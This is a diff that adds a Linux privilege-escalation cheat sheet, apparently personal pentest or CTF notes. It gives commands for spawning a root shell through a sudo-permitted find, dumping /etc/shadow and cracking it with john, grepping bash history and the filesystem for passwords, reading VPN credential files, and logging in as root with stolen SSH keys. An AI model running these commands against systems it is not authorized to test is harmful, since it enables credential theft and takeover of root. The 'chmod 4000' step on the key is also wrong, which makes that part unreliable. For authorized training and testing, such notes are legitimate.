@@ -1,0 +1,58 @@
+Linux Enum:
+    whoami 
+    id : give us the user group
+    sudo -l : display that we can run as sudo
+        If we find something that could be used by SUID or Sudo exploit:
+            https://gtfobins.github.io/gtfobin
+
+            ex: (root) NOPASSWD: /usr/bin/find
+                (root) NOPASSWD: /usr/bin/nano
+
+                Find:
+                    Sudo
+                        If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and 
+                        may be used to access the file system, escalate or maintain privileged access.
+                            sudo find . -exec /bin/sh \; -quit
+
+                    If Escalade == successfull:
+                        cat /etc/shadow + /etc/passwd 
+                    Then:
+                        In order to unshadow to the two files we need to execute
+                            unshadow passwd.txt shadow.txt > unshadowed.txt
+                            john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+
+    history: find past cmd input
+    
+
+    Network Enumeration:
+        ip a
+        ip route
+        arp -a or ip neigh
+        netstat -ano: What ports op + communication
+
+    Password Hunting:
+        cat ~/.bash_history | grep -i passw: Could display passwords
+        grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null : display all the words with password find in system
+        locate password | more    
+
+        if root access: cat /etc/openvpn/auth.txt 
+
+        cat ~/.bash_history | grep -i passw: display mysql creds: ex mysql -h somehost.local -uroot -ppassword123
+
+    We can use "linpeas" to automatically enum in linux machine
+          
+
+    Kernel exploit:
+        doc: https://github.com/lucyoa/kernel-exploits
+
+        Escalation via Kernel Exploit:
+            uname -a <-- find version
+
+
+    Escalation via SSH Keys:
+        find / -name authorized_keys: Find SSH Keys 
+        find / -name id_rsa 2> /dev/null
+            if we found the backup file:
+                copy the result to our Kali (id_rsa):
+                    chmod 4000 id_rsa
+                    ssh -i id_rsa root@<ip> <--- it should open a root terminal  
